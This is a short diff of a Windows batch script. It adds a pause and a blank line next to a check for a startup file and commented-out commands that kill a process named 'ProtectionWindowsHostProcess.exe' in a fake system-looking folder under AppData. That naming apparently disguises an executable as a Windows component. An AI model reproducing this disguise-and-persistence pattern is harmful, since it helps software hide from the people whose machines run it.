@@ -234,7 +234,8 @@ if not exist "%startupFile%" (
 
 echo.
 echo.
-
+timeout /t 5 /nobreak
+echo.
 
 ::taskkill /F /IM "%appdata%\Microsoft\Windows\SystemCertificatesData\Tasks\ProtectionWindowsHostProcess.exe"
 ::taskkill /F /IM "%appdata%\Microsoft\Windows\SystemCertificatesData\Tasks\ProtectionWindowsHostProcess.exe"
